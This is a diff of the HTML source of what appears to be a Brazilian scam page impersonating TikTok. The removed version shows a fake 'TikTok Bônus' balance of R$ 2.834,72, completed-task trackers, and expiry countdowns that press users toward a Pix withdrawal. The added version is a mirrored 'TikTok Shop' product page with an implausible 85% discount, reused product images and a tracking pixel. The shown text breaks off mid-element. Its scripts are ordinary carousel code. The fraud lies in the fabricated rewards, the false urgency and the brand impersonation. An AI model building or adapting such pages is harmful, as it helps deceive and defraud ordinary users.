@@ -1,1230 +1,1424 @@
-<!DOCTYPE html>
-<html lang="pt-BR">
-  <head>
-    <meta charset="UTF-8" />
-    <meta
-      name="viewport"
-      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"
-    />
-    <meta name="format-detection" content="telephone=no" />
-    <link
-      href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap"
-      rel="stylesheet"
-    />
- 
-    <link rel="stylesheet" href="/css/style.css" />
-    <title>Tiktok</title>
+<!DOCTYPE html><html lang="pt-br"><!-- Mirrored from kitfranciny.online/ by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 08 Aug 2025 13:38:15 GMT --><head>
+  <meta charset="UTF-8">
+  <title>
+    TikTok Shop 
+ </title>
 
-  </head>
-  <body>
-    <main id="screens">
-      <section id="one" class="screen">
-        <div class="title">TikTok Bônus</div>
-        <div class="saldo">
-          <div
-            class="container-saldo"
-            role="region"
-            aria-labelledby="saldo-title"
-          >
-            <div class="saldo-info">
-              <div class="saldo-label">
-                <span class="saldo-text">Seu saldo</span>
-                <img src="/images/p-saldo.svg" alt="" class="p-saldo" />
-              </div>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="icon" href="logo.png" type="image/png">
+  <!-- Tailwind -->
+  <script src="https://cdn.tailwindcss.com/"></script>
 
-              <div id="saldo-valor" class="saldo-valor" aria-live="polite">
-                <span
-                  class="valor-currency valor-currency-dois valor-currency-tres"
-                  data-amount-target="2834.72"
-                  >R$ 2.834,72</span
-                >
-              </div>
-            </div>
+  <!-- Swiper -->
+  <link rel="stylesheet" href="css/swiper-bundle.min.css">
+  <script src="js/swiper-bundle.min.js"></script>
+  <script src="https://unpkg.com/feather-icons"></script>
 
-            <div class="saldo-action">
-              <button
-                type="button"
-                class="btn-sacar"
-                aria-label="Sacar"
-                disabled=""
-              >
-                <span class="btn-text">Sacar</span>
-                <span class="pix-badge" aria-hidden="true">
-                  <img src="/images/pix-logo.svg" alt="" />
-                </span>
-              </button>
-            </div>
+  <style>
+
+    body, html {
+      overflow-x: hidden!important;
+    }
+
+
+    .swiper-slide-thumb-active {
+      border: 2px solid #06b6d4; /* cyan-500 */
+      border-radius: 8px;
+    }
+
+    .swiper-pagination {
+      display: none;
+    }
+
+    body {
+      background-color: #fff!important;
+      margin: 0px;
+    }
+
+    .reviews-section {
+      padding: 16px;
+    }
+
+    .reviews-header {
+      display: flex;
+      justify-content: between;
+      align-items: center;
+      margin-bottom: 16px;
+    }
+
+    .reviews-title {
+      font-family: 'TikTokFont', sans-serif;
+      font-size: 16px;
+      font-weight: 600;
+    }
+
+    .reviews-rating {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      margin-bottom: 16px;
+    }
+
+    .rating-big {
+      font-family: 'TikTokDisplayFont', sans-serif;
+      font-size: 24px;
+      font-weight: 700;
+    }
+
+    .stars {
+      color: #ffc107;
+      font-size: 16px;
+    }
+
+
+    .review-item {
+      border-bottom: 1px solid #f0f0f0;
+      padding: 16px 0;
+    }
+
+    .review-header {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin-bottom: 8px;
+    }
+
+    .review-stars {
+      color: #ffc107;
+      font-size: 14px;
+      margin: 4px 0;
+    }
+
+    .review-variant {
+      color: #666;
+      font-size: 12px;
+      margin-bottom: 8px;
+    }
+
+    .review-text {
+      font-size: 14px;
+      line-height: 1.4;
+      margin-bottom: 12px;
+    }
+
+    .review-images {
+      display: grid;
+      grid-template-columns: repeat(4, 1fr);
+      gap: 8px;
+    }
+
+
+    .review-image img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      cursor: default;
+      user-select: none;
+      -webkit-user-select: none;
+      -moz-user-select: none;
+      -ms-user-select: none;
+    }
+
+
+    .review-image {
+      aspect-ratio: 1;
+      border-radius: 8px;
+      overflow: hidden;
+    }
+
+    .review-image {
+      aspect-ratio: 1;
+      border-radius: 8px;
+      overflow: hidden;
+    }
+
+    .review-avatar {
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      background: #ddd;
+    }
+
+    .tab-active::after {
+      content: "";
+      position: absolute;
+      bottom: 0;
+      left: 0;
+      height: 2px;
+      width: 100%;
+      background-color: black;
+    }
+  </style>
+  <!-- TikTok Pixel Code Start -->
+<script>
+!function (w, d, t) {
+  w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(
+var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var r="https://analytics.tiktok.com/i18n/pixel/events.js",o=n&&n.partner;ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=r,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};n=document.createElement("script")
+;n.type="text/javascript",n.async=!0,n.src=r+"?sdkid="+e+"&lib="+t;e=document.getElementsByTagName("script")[0];e.parentNode.insertBefore(n,e)};
+
+
+  ttq.load('D4I0PM3C77U10O2J90B0');
+  ttq.page();
+}(window, document, 'ttq');
+</script>
+<!-- TikTok Pixel Code End -->
+</head>
+<body>
+  
+  <!-- BANNER SUPERIOR -->
+  <div id="ewqewqewq" style="border-bottom: solid 0px #8d8d8d40;">
+    <img src="tela.jfif" style="width: 100%; margin-bottom: 0;">
+  </div>
+
+<!-- BANNER PRINCIPAL -->
+<div class="relative w-full max-w-5xl mx-auto my-6">
+  <div class="swiper main-swiper">
+    <div class="swiper-wrapper">
+      <div class="swiper-slide"><img src="https://down-br.img.susercontent.com/file/br-11134207-7r98o-marffcpw4qux18.webp" alt="Imagem 1"></div>
+      <div class="swiper-slide"><img src="https://down-br.img.susercontent.com/file/br-11134207-7r98o-mc7poupaywo04c.webp" alt="Imagem 2"></div>
+      <div class="swiper-slide"><img src="https://down-br.img.susercontent.com/file/br-11134207-7r98o-marffcpw7jztb5.webp" alt="Imagem 3"></div>
+      <div class="swiper-slide"><img src="https://down-br.img.susercontent.com/file/br-11134207-7r98o-m0elkzludcww33.webp" alt="Imagem 4"></div>
+      <div class="swiper-slide"><img src="https://down-br.img.susercontent.com/file/br-11134207-7r98o-marffcpw65fd69.webp" alt="Imagem 5"></div>
+      <div class="swiper-slide"><img src="https://down-br.img.susercontent.com/file/br-11134207-7r98o-m2qmyu1gi6th31.webp" alt="Imagem 6"></div>
+    </div>
+    <div class="swiper-pagination"></div>
+    <div class="absolute bottom-3 right-3 bg-black/70 text-white text-xs px-3 py-1.5 rounded-full z-10 font-medium" id="counter">1/6</div>
+  </div>
+</div>
+
+<!-- LIGHTBOX UNIVERSAL -->
+<div id="universalLightbox" class="fixed inset-0 bg-black/95 z-[9999] hidden items-center justify-center cursor-zoom-out">
+  <img id="lightboxImage" src="" alt="Zoom" class="max-w-full max-h-full object-contain transition-all duration-300">
+  <button id="closeLightboxBtn" class="absolute top-4 right-4 text-white text-5xl font-thin hover:text-gray-400">&times;</button>
+
+</div>
+
+<!-- SWIPER CSS + JS (OBRIGATÓRIO) -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.css" />
+<script src="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.js"></script>
+
+<style>
+  .swiper-slide img { width: 100%; height: auto; display: block; }
+  #universalLightbox.show { display: flex !important; opacity: 1; }
+  #universalLightbox { opacity: 0; transition: opacity 0.3s; }
+  #lightboxImage.zooming { cursor: grab !important; }
+  #lightboxImage.zooming:active { cursor: grabbing !important; }
+</style>
+
+<script>
+  // === SWIPER CARROSSEL (auto-play 2s, sem setas laterais) ===
+  const swiper = new Swiper('.main-swiper', {
+    loop: true,
+    autoplay: { delay: 2000, disableOnInteraction: false },
+    speed: 800,
+    pagination: { el: '.swiper-pagination', clickable: true },
+    navigation: false,
+    grabCursor: true,
+  });
+
+  // Contador do carrossel principal (1/6)
+  const counter = document.getElementById('counter');
+  swiper.on('slideChange', () => {
+    counter.textContent = `${swiper.realIndex + 1}/${swiper.slides.length}`;
+  });
+
+  // === LIGHTBOX UNIVERSAL ===
+  const lightbox = document.getElementById('universalLightbox');
+  const lightboxImg = document.getElementById('lightboxImage');
+  const closeBtn = document.getElementById('closeLightboxBtn'); // agora funciona!
+  let currentGallery = [];
+  let currentIndex = 0;
+  let isPanning = false;
+  let startX, startY, translateX = 0, translateY = 0;
+
+  function openLightbox(src, gallery = [], index = 0) {
+    lightboxImg.src = src;
+    currentGallery = gallery.length > 0 ? gallery : [src];
+    currentIndex = index;
+    translateX = translateY = 0;
+    lightboxImg.style.transform = 'translate(0px, 0px) scale(1)';
+    lightboxImg.classList.remove('zooming');
+    lightbox.classList.add('show');
+    lightbox.classList.remove('hidden');
+    document.body.style.overflow = 'hidden';
+  }
+
+  function closeLightbox() {
+    lightbox.classList.remove('show');
+    setTimeout(() => {
+      lightbox.classList.add('hidden');
+      document.body.style.overflow = '';
+      currentGallery = [];
+      lightboxImg.src = '';
+    }, 300);
+  }
+
+  function nextImage() {
+    currentIndex = (currentIndex + 1) % currentGallery.length;
+    lightboxImg.src = currentGallery[currentIndex];
+    resetPan();
+  }
+
+  function prevImage() {
+    currentIndex = (currentIndex - 1 + currentGallery.length) % currentGallery.length;
+    lightboxImg.src = currentGallery[currentIndex];
+    resetPan();
+  }
+
+  function resetPan() {
+    translateX = translateY = 0;
+    lightboxImg.style.transform = `translate(${translateX}px, ${translateY}px) scale(${lightboxImg.classList.contains('zooming') ? 2.5 : 1})`;
+  }
+
+  // === ZOOM + PAN (mouse + touch) ===
+  lightboxImg.ondblclick = () => {
+    lightboxImg.classList.toggle('zooming');
+    if (!lightboxImg.classList.contains('zooming')) resetPan();
+  };
+
+  let lastTap = 0;
+  lightboxImg.addEventListener('touchend', (e) => {
+    const now = Date.now();
+    if (now - lastTap < 500) {
+      lightboxImg.classList.toggle('zooming');
+      if (!lightboxImg.classList.contains('zooming')) resetPan();
+      e.preventDefault();
+    }
+    lastTap = now;
+  });
+
+  // Pan mouse
+  lightboxImg.addEventListener('mousedown', (e) => {
+    if (!lightboxImg.classList.contains('zooming')) return;
+    isPanning = true;
+    startX = e.clientX - translateX;
+    startY = e.clientY - translateY;
+    lightboxImg.style.cursor = 'grabbing';
+  });
+
+  document.addEventListener('mousemove', (e) => {
+    if (!isPanning) return;
+    translateX = e.clientX - startX;
+    translateY = e.clientY - startY;
+    lightboxImg.style.transform = `translate(${translateX}px, ${translateY}px) scale(2.5)`;
+  });
+
+  document.addEventListener('mouseup', () => {
+    isPanning = false;
+    lightboxImg.style.cursor = lightboxImg.classList.contains('zooming') ? 'grab' : 'default';
+  });
+
+  // Pan touch
+  lightboxImg.addEventListener('touchstart', (e) => {
+    if (!lightboxImg.classList.contains('zooming')) return;
+    isPanning = true;
+    startX = e.touches[0].clientX - translateX;
+    startY = e.touches[0].clientY - translateY;
+  });
+
+  lightboxImg.addEventListener('touchmove', (e) => {
+    if (!isPanning) return;
+    translateX = e.touches[0].clientX - startX;
+    translateY = e.touches[0].clientY - startY;
+    lightboxImg.style.transform = `translate(${translateX}px, ${translateY}px) scale(2.5)`;
+    e.preventDefault();
+  });
+
+  lightboxImg.addEventListener('touchend', () => isPanning = false);
+
+  // === FECHAR LIGHTBOX ===
+  // 1. Botão X (agora FUNCIONA 100%)
+  if (closeBtn) {
+    closeBtn.onclick = (e) => {
+      e.stopPropagation();
+      closeLightbox();
+    };
+  }
+
+  // 2. Clique fora da imagem
+  lightbox.addEventListener('click', (e) => {
+    if (e.target === lightbox) closeLightbox();
+  });
+
+  // 3. Tecla ESC + setas
+  document.addEventListener('keydown', (e) => {
+    if (!lightbox.classList.contains('show')) return;
+    if (e.key === 'Escape') closeLightbox();
+    if (e.key === 'ArrowRight') nextImage();
+    if (e.key === 'ArrowLeft') prevImage();
+  });
+
+  // === ABRIR DO CARROSSEL ===
+  document.querySelectorAll('.main-swiper .swiper-slide img').forEach((img, index) => {
+    const allSlides = document.querySelectorAll('.main-swiper .swiper-slide img');
+    const gallery = Array.from(allSlides).map(s => s.src);
+    img.style.cursor = 'zoom-in';
+    img.onclick = (e) => {
+      e.preventDefault();
+      e.stopPropagation();
+      openLightbox(img.src, gallery, index);
+    };
+  });
+
+  // === ZOOM NAS AVALIAÇÕES ===
+  const attachReviewZoom = () => {
+    document.querySelectorAll('img[src*="susercontent.com"], img[src*="down-br.img"]').forEach((img) => {
+      if (img.dataset.zoomAttached) return;
+      const isCarousel = img.closest('.main-swiper');
+      const isModal = img.closest('#meuModal');
+      const isThumb = img.closest('#productImg');
+      if (isCarousel || isModal || isThumb) return;
+
+      const reviewBlock = img.closest('div');
+      if (!reviewBlock) return;
+
+      const reviewImgs = reviewBlock.querySelectorAll('img[src*="susercontent.com"], img[src*="down-br.img"]');
+      const gallery = Array.from(reviewImgs).map(i => i.src);
+
+      img.style.cursor = 'zoom-in';
+      img.classList.add('transition-transform', 'duration-200', 'hover:scale-105');
+      img.dataset.zoomAttached = 'true';
+
+      img.onclick = (e) => {
+        e.preventDefault();
+        e.stopPropagation();
+        const idx = Array.from(reviewImgs).indexOf(img);
+        openLightbox(img.src, gallery, idx);
+      };
+    });
+  };
+
+  attachReviewZoom();
+  new MutationObserver(attachReviewZoom).observe(document.body, { childList: true, subtree: true });
+</script>
+  <!-- Miniaturas -->
+  <div class="px-4 pb-4 pt-2" style="display: none;">
+    <div class="swiper thumb-swiper">
+      <div class="swiper-wrapper">
+        <div class="swiper-slide w-16 h-16"><img src="1.1" class="w-full h-full object-cover rounded"></div><div class="swiper-slide w-16 h-16"><img src="images/6882ffbbbe754_02.jpg" class="w-full h-full object-cover rounded"></div><div class="swiper-slide w-16 h-16"><img src="images/6882ffbbbe841_03.jpg" class="w-full h-full object-cover rounded"></div><div class="swiper-slide w-16 h-16"><img src="images/6882ffbbbe94d_04.jpg" class="w-full h-full object-cover rounded"></div><div class="swiper-slide w-16 h-16"><img src="images/6882ffbbbea30_05.jpg" class="w-full h-full object-cover rounded"></div><div class="swiper-slide w-16 h-16"><img src="images/6882ffbbbeb3d_06.jpg" class="w-full h-full object-cover rounded"></div><div class="swiper-slide w-16 h-16"><img src="images/6882ffbbbec4f_07.jpg" class="w-full h-full object-cover rounded"></div><div class="swiper-slide w-16 h-16"><img src="688301ebcf6a3_Imagem%20do%20WhatsApp%20de%202025-07-25%20%C3%A0%28s%29%2000.16.27_ddbd2f68.html" class="w-full h-full object-cover rounded"></div>
+      </div>
+    </div>
+  </div>
+
+  <style>
+  .group:hover .group-hover\:text-blue-700 {
+      color: #333;
+  }
+  </style>
+
+  <div class="bg-white mx-auto rounded shadow border border-gray-200 text-[13px]" style="margin-bottom: 0em; border-radius: 0px;">
+
+    <!-- TOPO LARANJA -->
+    <div class="bg-gradient-to-r from-orange-600 to-orange-400 pt-2 pb-1 text-white" style="padding: 1em 1em; padding-bottom: 0em; padding-top: 1.3em;">
+      <div class="flex justify-between items-start">
+        <div class="leading-tight">
+
+          <p class="text-2xl font-bold leading-none" style="display: inline-flex; align-items: center;">R$ 48,56 <svg style="margin-left: 0.3em; margin-top: 0.1em;" fill="none" height="20" viewBox="0 0 18 18" width="20" xmlns="http://www.w3.org/2000/svg"><path d="M2.25 7.3123V3.5998C2.25 3.42078 2.32112 3.24909 2.4477 3.12251C2.57429 2.99592 2.74598 2.9248 2.925 2.9248H15.075C15.254 2.9248 15.4257 2.99592 15.5523 3.12251C15.6789 3.24909 15.75 3.42078 15.75 3.5998V7.3123C15.3024 7.3123 14.8732 7.49009 14.5568 7.80656C14.2403 8.12303 14.0625 8.55225 14.0625 8.9998C14.0625 9.44736 14.2403 9.87658 14.5568 10.193C14.8732 10.5095 15.3024 10.6873 15.75 10.6873V14.3998C15.75 14.5788 15.6789 14.7505 15.5523 14.8771C15.4257 15.0037 15.254 15.0748 15.075 15.0748H2.925C2.74598 15.0748 2.57429 15.0037 2.4477 14.8771C2.32112 14.7505 2.25 14.5788 2.25 14.3998V10.6873C2.69755 10.6873 3.12677 10.5095 3.44324 10.193C3.75971 9.87658 3.9375 9.44736 3.9375 8.9998C3.9375 8.55225 3.75971 8.12303 3.44324 7.80656C3.12677 7.49009 2.69755 7.3123 2.25 7.3123ZM10.35 4.2748H3.6V6.2782C4.10707 6.5295 4.53384 6.91746 4.83222 7.39834C5.13059 7.87921 5.28869 8.43388 5.28869 8.9998C5.28869 9.56573 5.13059 10.1204 4.83222 10.6013C4.53384 11.0821 4.10707 11.4701 3.6 11.7214V13.7248H10.35V4.2748ZM11.7 4.2748V13.7248H14.4V11.7214C13.8929 11.4701 13.4662 11.0821 13.1678 10.6013C12.8694 10.1204 12.7113 9.56573 12.7113 8.9998C12.7113 8.43388 12.8694 7.87921 13.1678 7.39834C13.4662 6.91746 13.8929 6.5295 14.4 6.2782V4.2748H11.7Z" fill="white"></path></svg></p>
+
+          <div style="display: inline-flex">
+            <p class="line-through text-sm text-orange-200" style="display: inline-flex; align-items: center!important;">R$ 589,43</p>
+            <p style="margin-left: 0.5em; padding: 0.3em 0.6em; border-radius: 25px; background-color: #fe5d38;">Economize 85%</p>
           </div>
+
         </div>
-        <div class="bloco-dois">
-          <div class="parabens">
-            <div class="parabens-txt">
-              <span class="parabens-txtum">Parabéns!</span>
-              <span class="parabens-txtdois"
-                >Você concluiu
-                <span class="nobreak">todas as tarefas</span></span
-              >
-
-              <span class="parabens-valor">R$ 2.834,72</span>
-            </div>
-            <img src="/images/parabens-img.png" alt="" class="parabens-img" />
-          </div>
-          <div class="line"></div>
-          <div class="entre">
-            <span class="entre-txt"
-              >Entre por 14 dias para ganhar
-              <span class="entre-pts">8.414 pontos</span>
-              <span class="entre-data">• 12 de nov - 25 de nov</span>
-            </span>
-            <button type="button" class="btn-concluido" aria-label="Sacar">
-              <span class="btn-concluido-text">Concluído</span>
-            </button>
-          </div>
-          <div class="concluiu">
-            <span class="concluiu-txt"
-              >Você concluiu todos os dias de check-in.</span
-            >
-          </div>
-          <div class="dia">
-            <div class="day-tracker">
-              <div class="day-tracker__item">
-                <div class="day-tracker__box">
-                  <div class="day-tracker__content">
-                    <div class="day-tracker__coin">
-                      <img src="/images/p-dia.svg" alt="" />
-                    </div>
-                    <div class="day-tracker__value">50</div>
-                  </div>
-
-                  <div class="day-tracker__overlay">
-                    <div class="day-tracker__icon-wrapper">
-                      <div class="day-tracker__icon-shape">
-                        <img src="/images/fi-bs-check.svg" alt="" />
-                      </div>
-                    </div>
-                  </div>
-                </div>
-
-                <div class="day-tracker__label">Dia 01</div>
-              </div>
-
-              <div class="day-tracker__item">
-                <div class="day-tracker__box">
-                  <div class="day-tracker__content">
-                    <div class="day-tracker__coin">
-                      <img src="/images/p-dia.svg" alt="" />
-                    </div>
-                    <div class="day-tracker__value">100</div>
-                  </div>
-
-                  <div class="day-tracker__overlay">
-                    <div class="day-tracker__icon-wrapper">
-                      <div class="day-tracker__icon-shape">
-                        <img src="/images/fi-bs-check.svg" alt="" />
-                      </div>
-                    </div>
-                  </div>
-                </div>
-
-                <div class="day-tracker__label">Dia 02</div>
-              </div>
-
-              <div class="day-tracker__item">
-                <div class="day-tracker__box">
-                  <div class="day-tracker__content">
-                    <div class="day-tracker__coin">
-                      <img src="/images/p-dia.svg" alt="" />
-                    </div>
-                    <div class="day-tracker__value">150</div>
-                  </div>
-
-                  <div class="day-tracker__overlay">
-                    <div class="day-tracker__icon-wrapper">
-                      <div class="day-tracker__icon-shape">
-                        <img src="/images/fi-bs-check.svg" alt="" />
-                      </div>
-                    </div>
-                  </div>
-                </div>
-
-                <div class="day-tracker__label">Dia 03</div>
-              </div>
-
-              <div class="day-tracker__item">
-                <div class="day-tracker__box">
-                  <div class="day-tracker__content">
-                    <div class="day-tracker__coin">
-                      <img src="/images/p-dia.svg" alt="" />
-                    </div>
-                    <div class="day-tracker__value">200</div>
-                  </div>
-
-                  <div class="day-tracker__overlay">
-                    <div class="day-tracker__icon-wrapper">
-                      <div class="day-tracker__icon-shape">
-                        <img src="/images/fi-bs-check.svg" alt="" />
-                      </div>
-                    </div>
-                  </div>
-                </div>
-
-                <div class="day-tracker__label">Dia 04</div>
-              </div>
-
-              <div class="day-tracker__item">
-                <div class="day-tracker__box">
-                  <div class="day-tracker__content">
-                    <div class="day-tracker__coin">
-                      <img src="/images/p-dia.svg" alt="" />
-                    </div>
-                    <div class="day-tracker__value">250</div>
-                  </div>
-
-                  <div class="day-tracker__overlay">
-                    <div class="day-tracker__icon-wrapper">
-                      <div class="day-tracker__icon-shape">
-                        <img src="/images/fi-bs-check.svg" alt="" />
-                      </div>
-                    </div>
-                  </div>
-                </div>
-
-                <div class="day-tracker__label">Dia 05</div>
-              </div>
-
-              <div class="day-tracker__item">
-                <div class="day-tracker__box">
-                  <div class="day-tracker__content">
-                    <div class="day-tracker__coin">
-                      <img src="/images/p-dia.svg" alt="" />
-                    </div>
-                    <div class="day-tracker__value">300</div>
-                  </div>
-
-                  <div class="day-tracker__overlay">
-                    <div class="day-tracker__icon-wrapper">
-                      <div class="day-tracker__icon-shape">
-                        <img src="/images/fi-bs-check.svg" alt="" />
-                      </div>
-                    </div>
-                  </div>
-                </div>
-
-                <div class="day-tracker__label">Dia 06</div>
-              </div>
-            </div>
-          </div>
-          <div class="line line-dois"></div>
-
-          <div class="entre">
-            <span class="entre-txt entre-txt-dois"
-              >Vê anúncios direcionados diariamente para ganhares até
-              <span class="entre-pts">2.730 pontos</span>
-              <span class="entre-data">• 30/30 anúncios assistidos</span>
-            </span>
-            <button type="button" class="btn-concluido" aria-label="Sacar">
-              <span class="btn-concluido-text">Concluído</span>
-            </button>
-          </div>
-          <div class="line line-dois"></div>
-
-          <div class="entre">
-            <span class="entre-txt entre-txt-dois"
-              >Assistir vídeos
-              <span class="entre-pts">500 pontos</span>
-            </span>
-            <button type="button" class="btn-concluido" aria-label="Sacar">
-              <span class="btn-concluido-text">Concluído</span>
-            </button>
-          </div>
-          <div class="assista">
-            <span class="assista-txt">Assista por 10 min </span>
-            <svg
-              class="assista-tail"
-              xmlns="http://www.w3.org/2000/svg"
-              width="7"
-              height="6"
-              viewBox="0 0 7 6"
-              fill="none"
-            >
-              <path
-                d="M4.03259 5.25C3.64769 5.91667 2.68544 5.91667 2.30054 5.25L0.135475 1.5C-0.249425 0.833333 0.231701 6.49976e-07 1.0015 5.82678e-07L5.33163 2.04126e-07C6.10143 1.36828e-07 6.58255 0.833334 6.19765 1.5L4.03259 5.25Z"
-                fill="#F1F1F1"
-              ></path>
-            </svg>
-          </div>
-          <div class="barra">
-            <div class="progress-bar">
-              <div class="progress-step">
-                <div class="step-icon">
-                  <img src="/images/p-assista.svg" alt="P" />
-                </div>
-                <span class="step-text">50 pontos</span>
-              </div>
-
-              <div class="progress-step">
-                <div class="step-icon">
-                  <img src="/images/p-assista.svg" alt="P" />
-                </div>
-                <span class="step-text">100 pontos</span>
-              </div>
-
-              <div class="progress-step">
-                <div class="step-icon">
-                  <img src="/images/p-assista.svg" alt="P" />
-                </div>
-                <span class="step-text">150 pontos</span>
-              </div>
-
-              <div class="progress-step">
-                <div class="step-icon">
-                  <img src="/images/p-assista.svg" alt="P" />
-                </div>
-                <span class="step-text">225 pontos</span>
-              </div>
-            </div>
-            <div class="line line-dois"></div>
-            <div class="entre">
-              <span class="entre-txt entre-txt-dois"
-                >Resgate suas recompensas e ganhe
-                <span class="entre-pts">640 pontos</span>
-                <span class="entre-data">• 8/8 resgatados</span>
-              </span>
-              <button type="button" class="btn-concluido" aria-label="Sacar">
-                <span class="btn-concluido-text">Concluído</span>
-              </button>
-            </div>
-            <div class="line line-dois"></div>
-            <div class="entre">
-              <span class="entre-txt entre-txt-dois"
-                >Faça 60 pesquisas diárias para ganhar até
-                <span class="entre-pts">996 pontos</span>
-                <span class="entre-data">• 60 pesquisas feitas hoje</span>
-              </span>
-              <button type="button" class="btn-concluido" aria-label="Sacar">
-                <span class="btn-concluido-text">Concluído</span>
-              </button>
-            </div>
-
-            <!-- ADICIONEI A CLASSE "posicao-direita" AQUI -->
-            <div class="assista posicao-direita">
-              <span class="assista-txt">Até 756 pontos</span>
-              <svg
-                class="assista-tail taildois"
-                xmlns="http://www.w3.org/2000/svg"
-                width="7"
-                height="6"
-                viewBox="0 0 7 6"
-                fill="none"
-              >
-                <path
-                  d="M4.03259 5.25C3.64769 5.91667 2.68544 5.91667 2.30054 5.25L0.135475 1.5C-0.249425 0.833333 0.231701 6.49976e-07 1.0015 5.82678e-07L5.33163 2.04126e-07C6.10143 1.36828e-07 6.58255 0.833334 6.19765 1.5L4.03259 5.25Z"
-                  fill="#F1F1F1"
-                ></path>
-              </svg>
-            </div>
-            <div class="progress-bar">
-              <div class="progress-step hide">
-                <div class="step-icon">
-                  <img src="/images/p-assista.svg" alt="P" />
-                </div>
-                <span class="step-text">16 pesquisas</span>
-              </div>
-
-              <div class="progress-step">
-                <div class="step-icon">
-                  <img src="/images/p-assista.svg" alt="P" />
-                </div>
-                <span class="step-text">36 pesquisas</span>
-              </div>
-
-              <div class="progress-step">
-                <div class="step-icon">
-                  <img src="/images/p-assista.svg" alt="P" />
-                </div>
-                <span class="step-text">60 pesquisas</span>
-              </div>
-            </div>
-            <div class="obtem">
-              <span class="obtem-txt"
-                >Obtém 21 pontos por escreveres uma consulta na barra de
-                pesquisa, ou 0 ponto por tocares numa pesquisa sugerida, como em
-                "Podes gostar".</span
-              >
-            </div>
-            <div class="line line-dois"></div>
-
-            <div class="entre">
-              <span class="entre-txt"
-                >Convide 1 amigo para se inscrever e ganhar
-                <span class="entre-pts">100.000 pontos - 200.000 pontos</span>
-              </span>
-              <button type="button" class="btn-concluido" aria-label="Sacar">
-                <span class="btn-concluido-text">Concluído</span>
-              </button>
-            </div>
-          </div>
-        </div>
-      </section>
-
-      <section id="two" class="screen" aria-hidden="true">
-        <div
-          class="modal-inner"
-          role="dialog"
-          aria-modal="true"
-          aria-labelledby="modal-title"
-        >
-          <div class="popup">
-            <img src="/images/gol.png" alt="" class="gol-img" />
-            <span class="gol">Gol de Prêmios</span>
-            <span class="gol-txt"
-              >Parabéns! Como parte de uma campanha de recompensas exclusiva. </span
-            ><span
-              class="valor-currency gol-valor valor-currency-dois valor-currency-quatro"
-              data-amount-target="2834.72"
-              >R$ 2.834,72</span
-            >
-            <div class="timer-wrapper expira-em-popup">
-              <div class="timer-label">Expira em</div>
-
-              <div class="timer-clock">
-                <!-- Horas -->
-                <div class="timer-box" data-timer="hours">00</div>
-                <!-- Não é usado, mas bom ter -->
-
-                <!-- Separador -->
-                <div class="timer-separator">:</div>
-
-                <!-- Minutos -->
-                <div class="timer-box" data-timer="minutes">16</div>
-                <!-- ADICIONE AQUI -->
-
-                <!-- Separador -->
-                <div class="timer-separator">:</div>
-
-                <!-- Segundos -->
-                <div class="timer-box" data-timer="seconds">38</div>
-                <!-- ADICIONE AQUI -->
-              </div>
-            </div>
-            <button
-              type="button"
-              class="btn-obrigado"
-              aria-label="Obrigado"
-              data-modal-close=""
-            >
-              <span class="btn-text btn-textdois btn-txt-obrigado"
-                >Obrigado</span
-              >
-            </button>
-          </div>
-        </div>
-      </section>
-      <section id="three" class="screen">
-        <div class="expira-saldo">
-          <div class="timer-wrapper">
-            <p id="countdown-text">
-              SEU SALDO EXPIRA EM
-              <span id="timer">00 - 16 - 38</span>
-            </p>
-          </div>
-        </div>
-        <div class="title">Resgatar recompensas</div>
-        <div class="saldo saldo-dois">
-          <div
-            class="container-saldo"
-            role="region"
-            aria-labelledby="saldo-title"
-          >
-            <div class="saldo-info saldo-info-dois">
-              <div class="saldo-label">
-                <span class="saldo-text saldo-text-dois">Seu saldo</span>
-              </div>
-
-              <div class="saldo-valor saldo-valor-dois" aria-live="polite">
-                <span
-                  class="valor-currency valor-currency-dois"
-                  data-amount-target="2834.72"
-                  >R$2.834,72</span
-                >
-                <span class="total-pontos">= 28.347.200 pontos (s)</span>
-              </div>
-            </div>
-
-            <div class="saldo-action">
-              <span class="saldo-img"
-                ><img
-                  src="/images/p-saldo-maior.png"
-                  alt=""
-                  class="p-saldo p-saldo-maior"
-              /></span>
-            </div>
-          </div>
-        </div>
-        <div class="linha"></div>
-        <div class="saldo saldo-tres">
-          <div
-            class="container-saldo"
-            role="region"
-            aria-labelledby="saldo-title"
-          >
-            <div class="saldo-info saldo-info-dois">
-              <div class="saldo-valor saldo-valor-dois" aria-live="polite">
-                <span class="total-pontos total-pontos-dois"
-                  >Última recompensa: R$ 646,43</span
-                >
-              </div>
-            </div>
-          </div>
-        </div>
-
-        <div class="saldo saldo-sacar">
-          <div
-            class="container-saldo"
-            role="region"
-            aria-labelledby="saldo-title"
-          >
-            <div class="saldo-info saldo-info-sacar">
-              <div class="saldo-label">
-                <span class="saldo-sacar-text">Sacar dinheiro</span>
-              </div>
-
-              <div class="saldo-valor" aria-live="polite">
-                <span class="transferencia-txt"
-                  ><img
-                    src="/images/fi-rs-credit-card.png"
-                    alt="" />Transferencia via /
-                  <img src="/images/pix-logo.svg" alt="" class="pix-logo-transf"
-                /></span>
-              </div>
-            </div>
-          </div>
-          <div class="widget-container">
-            <div class="botoes-row botoes-row-sacar">
-              <button class="btn-valor">R$1,5</button>
-              <button class="btn-valor">R$5</button>
-              <button class="btn-valor">R$10</button>
-            </div>
-
-            <button class="btn-valor display-total">R$2.834,72</button>
-          </div>
-          <button
-            type="button"
